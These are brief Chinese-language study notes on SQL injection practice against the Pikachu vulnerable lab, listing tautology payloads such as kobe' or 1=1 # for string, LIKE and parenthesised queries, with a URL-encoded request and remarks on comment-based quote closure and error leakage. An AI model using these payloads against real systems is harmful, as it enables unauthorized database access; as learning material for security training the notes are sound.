payload is
kobe' or 1=1 #

#是为了注释 必须要有

GET /pikachu/vul/sqli/sqli_str.php?name=kobe%27+or+1%3D1+%23&submit=%E6%9F%A5%E8%AF%A2 

注意url编码问题


like '%%'


like '%xxx%' or 1=1 #';

所以payload可以是
xxx%' or 1=1 #

#是为了把最后那个单引号注释掉
因为你加入你自己的闭合号，所以原本的那个闭合号你要注释掉


xx inject
=('xx')
=('xx') or 1=1 #')

xx') or 1=1 #


如果sql注入 输入一个'，页面直接出现mysql的原始报错异常
那么说明程序员没有catch exception 这是常见的漏洞
可以让黑客知道目标的数据库信息

如何构造闭合，才是关键
如果后端不适用拼接的方式
现在都是mybatis 基本不会使用拼接的方式
这种漏洞应该基本比较少了。


